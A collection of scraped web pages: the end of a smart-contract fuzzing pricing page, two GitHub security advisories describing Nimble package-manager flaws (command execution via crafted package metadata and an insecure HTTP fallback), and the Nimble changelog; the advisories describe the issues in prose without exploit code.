#### $250

* 1x Core Performance
* Unlimited 1 hour campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Pro Builder

For power users who require serious security, in-depth analysis and no time constraints.

#### $1,999

* 2x Core Performance
* Unlimited Hours and campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Enterprise

For larger teams needing multiple licenses, simultaneous campaigns and maximum performance.

#### Custom

* 4x Core Performance
* Unlimited Hours and campaigns
* Run 2 Campaigns at a time
* Supports Foundry projects

[Contact Us](https://share.hsforms.com/1TvCKjmAMTC2gCezqiexVTw2urwb)

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)



=== Content from github.com_09828651_20250115_195717.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-rg9f-w24h-962p)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-rg9f-w24h-962p)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=nim-lang%2Fsecurity)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[security](/nim-lang/security)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2Fsecurity) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fnim-lang%2Fsecurity)
* [Star
   5](/login?return_to=%2Fnim-lang%2Fsecurity)

* [Code](/nim-lang/security)
* [Issues
  1](/nim-lang/security/issues)
* [Pull requests
  0](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects
  0](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

Additional navigation options

* [Code](/nim-lang/security)
* [Issues](/nim-lang/security/issues)
* [Pull requests](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

# Nimble arbitrary code execution for specially crafted package metadata

High

[FedericoCeratto](/FedericoCeratto)
published
GHSA-rg9f-w24h-962p
Mar 26, 2021

## Package

Nimble
(Nim)

## Affected versions

< 1.4.4 (Nim release version)

## Patched versions

1.2.10 and 1.4.4

## Description

### Impact

doCmd is used in different places and can be leveraged to execute arbitrary commands.

An attacker can craft a malicious entry in the packages.json package list to trigger code execution.

### Workarounds

The official Nimble packages list at <https://github.com/nim-lang/packages> is manually reviewed.

### References

<https://consensys.net/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/>

### Severity

High

8.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
None

User interaction
Required

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H

### CVE ID

CVE-2021-21372

### Weaknesses

[CWE-20](/advisories?query=cwe%3A20)

### Credits

* [![@tintinweb](https://avatars.githubusercontent.com/u/2865694?s=40&v=4)](/tintinweb)
  [tintinweb](/tintinweb)
  Analyst

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_005ffc09_20250115_195718.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-8w52-r35x-rgp8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-8w52-r35x-rgp8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=nim-lang%2Fsecurity)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[security](/nim-lang/security)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2Fsecurity) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fnim-lang%2Fsecurity)
* [Star
   5](/login?return_to=%2Fnim-lang%2Fsecurity)

* [Code](/nim-lang/security)
* [Issues
  1](/nim-lang/security/issues)
* [Pull requests
  0](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects
  0](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

Additional navigation options

* [Code](/nim-lang/security)
* [Issues](/nim-lang/security/issues)
* [Pull requests](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

# Nimble falls back to insecure http url when fetching packages

High

[FedericoCeratto](/FedericoCeratto)
published
GHSA-8w52-r35x-rgp8
Mar 26, 2021

## Package

Nimble
(Nim)

## Affected versions

< 1.4.4 (Nim release version)

## Patched versions

1.2.10 and 1.4.4

## Description

### Impact

"nimble refresh" fetches a list of Nimble packages over HTTPS by default. In case of error it falls back to a non-TLS URL <http://irclogs.nim-lang.org/packages.json>

An attacker able to perform MitM can deliver a modified package list containing malicious software packages. If the packages are installed and used the attack escalates to untrusted code execution.

### References

<https://consensys.net/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/>

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
None

User interaction
Required

Scope
Changed

Confidentiality
Low

Integrity
High

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L

### CVE ID

CVE-2021-21373

### Weaknesses

[CWE-348](/advisories?query=cwe%3A348)

### Credits

* [![@tintinweb](https://avatars.githubusercontent.com/u/2865694?s=40&v=4)](/tintinweb)
  [tintinweb](/tintinweb)
  Analyst

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_ce3fa58b_20250114_222955.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fnimble%2Fblob%2Fmaster%2Fchangelog.markdown)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fnimble%2Fblob%2Fmaster%2Fchangelog.markdown)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nim-lang%2Fnimble)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[nimble](/nim-lang/nimble)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2Fnimble) You must be signed in to change notification settings
* [Fork
  189](/login?return_to=%2Fnim-lang%2Fnimble)
* [Star
   1.3k](/login?return_to=%2Fnim-lang%2Fnimble)

* [Code](/nim-lang/nimble)
* [Issues
  204](/nim-lang/nimble/issues)
* [Pull requests
  13](/nim-lang/nimble/pulls)
* [Actions](/nim-lang/nimble/actions)
* [Projects
  0](/nim-lang/nimble/projects)
* [Wiki](/nim-lang/nimble/wiki)
* [Security](/nim-lang/nimble/security)
* [Insights](/nim-lang/nimble/pulse)

Additional navigation options

* [Code](/nim-lang/nimble)
* [Issues](/nim-lang/nimble/issues)
* [Pull requests](/nim-lang/nimble/pulls)
* [Actions](/nim-lang/nimble/actions)
* [Projects](/nim-lang/nimble/projects)
* [Wiki](/nim-lang/nimble/wiki)
* [Security](/nim-lang/nimble/security)
* [Insights](/nim-lang/nimble/pulse)

## Files

¬†master
## Breadcrumbs

1. [nimble](/nim-lang/nimble/tree/master)
/
# changelog.markdown

Copy path Blame  Blame
## Latest commit

## History

[History](/nim-lang/nimble/commits/master/changelog.markdown)551 lines (433 loc) ¬∑ 24 KB¬†master
## Breadcrumbs

1. [nimble](/nim-lang/nimble/tree/master)
/
# changelog.markdown

Top
## File metadata and controls

* Preview
* Code
* Blame

551 lines (433 loc) ¬∑ 24 KB[Raw](https://github.com/nim-lang/nimble/raw/refs/heads/master/changelog.markdown)
# Nimble changelog

## 0.16.4

* SAT solver now fallbacks to the previous version if the latest version of the packages involved in the resolution are unsatisfiable.
* Improves Nim version selection by giving priority to the user system Nim version when it is compatible with the package requirements.
* Caches tagged packages.
* Other fixes and improvements.

## 0.16.3

* Nim dependencies now use precompiled binaries when available. One can opt-out it by using `--disableNimBinaries`.
* Improves sat error messages. Making it easier to spot conflicting dependencies.
* Other fixes and improvements.

## 0.16.2

* Adds a `requires` flag which allows to add extra packages to the dependency resolution.
* Zero to hero: nimble is able to function without `nim` in the path.
* The SAT solver is now the default solver.

## 0.16.1

* Improves `nimDir`'s `nim` selection heuristic.
* Fixes a bug where the SAT cache downloaded packages in the wrong directory.
* Other fixes and improvements.

## 0.16.0

* Implemented a new experimental SAT solver for dependency resolution.
* Implemented support for self-bootstrapping when no Nim is present.
* Added support for package entry points.
* Improved Nim version management.
* Other fixes and improvements.

## 0.14.0

This is a major release containing four new features:

* A new dependencies development mode.
* Support for lock files.
* Download tarballs when downloading packages from GitHub.
* A setup command.
* Added a `--package, -p` command line option.

## 0.13.0

This is a bugfix release. It enhances the security in multiple aspects:

* URLs default to `https`.
* SSL certificates are checked.
* Shell escaping bugs have been fixed.

## 0.12.0

This is a major release containing multiple improvements and bug fixes:

* `nimble dump` now provides `--json` output.
* Calls to the Nim compiler now display `--hints:off` output by default.
  The `--verbose` flag will print the full Nim command as well as regular
  compiler output.
* Custom tasks can now be passed compiler flags as well as run flags when run
  as `nimble <compflags> task <runflags>`. This includes the custom `test`
  task if defined. Compile flags are forwarded to `nim e` that executes the
  `.nimble` task and can be used to set `--define:xxx` and other compiler flags
  that are applicable in Nimscript mode. Run flags can be accessed per usual
  from `commandLineParams: seq[string]`.
* The default `nimble test` task also allows passing compiler flags but given
  run flags are not really applicable for multiple test binaries, it allows
  specifying compile flags before or after the `test` task.
* `nimble install` also allows passing compiler flags similar to the default
  `nimble test` and no longer requires the `--passNim` flag.
* The Nim compiler to be used by Nimble can now be specified with the `--nim`
  flag. This is useful for debugging purposes.
* Nimble now supports project local dependency mode - if a `nimbledeps` directory
  exists within a project, Nimble will use it to store all package dependencies
  instead of `~/.nimble/bin`. This enables isolation of a project and its
  dependencies from other projects being developed.
* The `-l | --localdeps` flag can be used to setup a project in local dependency
  mode.
* Nimble output can now be suppressed using `--silent`.
* Binaries compiled by Nimble can now be named differently than the source file
  with the `namedBin` table instead of `bin`. In addition, binary names that clash
  with a `pkgname` directory containing .nim files no longer require appending
  `pkg` to the directory.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.11.4...v0.12.0>

## 0.11.4 - 19/05/2020

This is a minor release containing just 2 commits and a few minor bug fixes.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.11.2...v0.11.4>

## 0.11.2 - 02/05/2020

This is a minor release containing just 15 commits. This release brings mostly
bug fixes with some minor new features:

* The `==` operator can now be used in version requirements.
* Handling of arguments for `nimble run` has been improved.
* The `nimble run` command can now be used without any arguments if the
  package has only one binary specified.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.11.0...v0.11.2>

## 0.11.0 - 22/09/2019

This is a major release containing nearly 60 commits. Most changes are
bug fixes, but this release also includes a couple new features:

* Binaries can now be built and run using the new `run` command.
* The `NimblePkgVersion` is now defined so you can easily get the package
  version in your source code
  ([example](https://github.com/nim-lang/nimble/blob/4a2aaa07d/tests/nimbleVersionDefine/src/nimbleVersionDefine.nim)).

Some other highlights:

* Temporary files are now kept when the `--debug` flag is used.
* Fixed dependency resolution issues with "#head" packages (#432 and #672).
* The `install` command can now take Nim compiler flags via the new
  `--passNim` flag.
* Command line arguments are now passed properly to tasks (#633).
* The `test` command now respects the specified backend (#631).
* The `dump` command will no longer prompt and now has an implicit `-y`.
* Fixed bugs with the new nimscript executor (#665).
* Fixed multiple downloads and installs of the same package (#678).
* Nimble init no longer overwrites existing files (#581).
* Fixed incorrect submodule version being pulled when in a non-master branch (#675).

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.10.2...v0.11.0>

## 0.10.2 - 03/06/2019

This is a small release which avoids object variant changes that are now
treated as runtime errors (Nim #1286). It also adds support for `backend`
selection during `nimble init`.

Multiple bug fixes are also included:

* Fixed an issue where failing tasks were not returning a non-zero return
  value (#655).
* Error out if `bin` is a Nim source file (#597).
* Fixed an issue where nimble task would not run if file of same name exists.
* Fixed an issue that prevented multiple instances of nimble from running on
  the same package.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.10.0...v0.10.2>

## 0.10.0 - 27/05/2019

Nimble now uses the Nim compiler directly via `nim e` to execute nimble
scripts rather than embedding the Nim VM. This has multiple benefits:

* Evolve independently from Nim enabling new versions of Nimble to work
  with multiple versions of Nim.
* Inherit all nimscript enhancements and bug fixes rather than having to
  duplicate functionality.
* Fast build time and smaller binary.
* No dependency on the compiler package which could cause dependency issues
  when nimble is used as a package.

Several other features and fixes have been implemented to improve general
development and test workflows.

* `nimble test` now sports a `-continue` or `-c` flag that allows tests
  to continue on failure, removes all created test binaries on completion
  and warns if no tests found.
* The `--inclDeps` or `-i` flag enables `nimble uninstall` to remove all
  dependent packages during uninstall.
* Added documentation on the usage of a custom `nimbleDir`.
* Package type interactive prompt is more readable.
* Save temporary files in a per-user temp dir to enable Nimble on multi-user
  systems.
* CTRL-C is now handled correctly in interactive prompts.
* Fixed issue where empty package list led to error.
* Fixed issue where file:// was prepended incorrectly.
* Fixed miscellaneous issues in version parsing, GitHub auth and briefClone.
* Miscellaneous cleanup of deprecated procs.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.9.0...v0.10.0>

## 0.9.0 - 19/09/2018

This is a major new release which contains at least one breaking change.
Unfortunately even though it was planned, support for lock files did not
make it into this release. The release does
however contain a large number of fixes spread across 57 commits.

The breaking change in this release is to do with the handling of binary
package. **Any package that specifies a `bin` value in it's .nimble file**
**will no longer install any Nim source code files**, in other words it's not
going to be a hybrid package by default. This means that so called "hybrid
packages" now need to specify `installExt = @["nim"]` in their metadata,
otherwise they will become binary packages only.

* **Breaking:** hybrid packages require `installExt = @["nim"]`
  ([Commit](https://github.com/nim-lang/nimble/commit/09091792615eacd503e87ca70252c572a4bde2b5))
* **The `init` command can now show a list of choices for information such as**
  **the license.**
* **The `init` command now creates correct project structures for all package**
  **types.**
* **Fatal errors are no longer created when the path inside a .nimble-link file**
  **doesn't exist.**
* **The `develop` command now always clones HEAD and grabs the full repo history.**
* **The default `test` task no longer executes all tests (only those starting with 't').**
* Colour is no longer used when `isatty` is false.
* `publish` now shows the URL of the created PR.
* The `getPkgDir` procedure has been fixed in the Nimble file API.
* Improved handling of proxy environment variables.
* Codebase has been improved not to rely on `nil` in strings and seqs.
* The handling of pre- and post-hooks has been improved significantly.
* Fixed the `path` command for packages with a `srcDir` and optimised the
  package look-up.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.8.10...v0.9.0>

## 0.8.10 - 23/02/2018

The first release of 2018! Another fairly big release containing 40 commits.
This release fixes many
issues, with most being fixed by our brilliant contributors. Thanks a lot
everyone!

One big new feature is the new support for multiple Nimble packages in a single
Git/Hg repository. You can now specify `?subdir=<dir>` at the end of your
repo's URL and Nimble will know to look in `<dir>` for your package.

* **Implemented support for multi-package repos.** See
  [#421](https://github.com/nim-lang/nimble/issues/421) for the relevant issue.
* **Better error message when the user has an outdated stdlib version that confuses Nimble**
* **The validity of a Nimble package can now be checked using the new `check` command**
* Nimble no longer silently ignores an erroneous '@' in for example
  `nimble install compiler@`.
* Issues with the `nimble path` command have been fixed.
* The `nimble publish` command has been improved and stabilised.
* Messages for the `NIM_LIB_PREFIX` env var have been improved.
* `before install` is now called when packages are installed by their name.
  See [#280](https://github.com/nim-lang/nimble/issues/280).
* Fixed issue with `nimble init`. See [#446](https://github.com/nim-lang/nimble/issues/446).
* Nimble now rejects [reserved names on Windows](https://github.com/nim-lang/nimble/commit/74856a87084b73451254555b2c20ad932cf84270).
* The `NIMBLE_DIR` environment variable is now supported, in addition to the
  command line flag and config setting.
* The `init` command has been improved significantly.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.8.8...v0.8.10>

## 0.8.8 - 03/09/2017

This is a relatively big release containing 57 commits, with multiple new
features and many bug fixes.

* **Implemented the `develop` command.** See
  [readme](https://github.com/nim-lang/nimble#nimble-develop) for details.
* **Implemented a default `test` task** for packages that don't define it.
* **Lowered the memory consumption** in cases where a package contained many files.
* Nimble now accepts .nimble symlinks.
* Locally stored package list files can now be specified in the Nimble config.
* Fixed branch checkout and handling of branch names with dashes.
* Improved URL detection in `publish` feature.
* Fixed many issues related to binary management. Packages are now resymlinked
  when an newer version is removed.
  ([#331](https://github.com/nim-lang/nimble/issues/331))
* Fixed issues with CLI arg passing to the Nim compiler.
  ([#351](https://github.com/nim-lang/nimble/issues/351))
* Improved performance of `list -i` command.
* Fixed issue where warnings weren't suppressed for some commands.
  ([#290](https://github.com/nim-lang/nimble/issues/290))
* Special versions other than `#head` are no longer considered to be newest.
* Improves the reverse dependency lookup by cross checking it with the
  installed list of packages.
  ([#287](https://github.com/nim-lang/nimble/issues/287))

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.8.6...v0.8.8>

## 0.8.6 - 05/05/2017

Yet another point release which includes various bug fixes and improvements.

* Improves heuristic for finding Nim standard library to support choosenim
  installations and adds ability to override it via `NIM_LIB_PREFIX`
  environment variable.
* Implement `--noColor` option to remove color from the output.
* Fixes bug when `srcDir` contains trailing slash.
* Fixes failure when `-d` flag is passed to `c` command.
* Show raw output for certain commands.
* GitHub API token can now be specified via the `NIMBLE_GITHUB_API_TOKEN`
  environment variable.
* GitHub API token is now stored in `~/.nimble/api_token` so that it
  doesn't need to be specified each time.
* Fixes multiple flags not being passed in Nimble task.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.8.4...v0.8.6>

## 0.8.4 - 29/01/2017

Another bug fix release which resolves problems related to stale nimscriptapi
files in /tmp/, no compilation output when `nimble build` fails, and issues
with the new package validation on Windows.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.8.2...v0.8.4>

## 0.8.2 - 08/01/2017

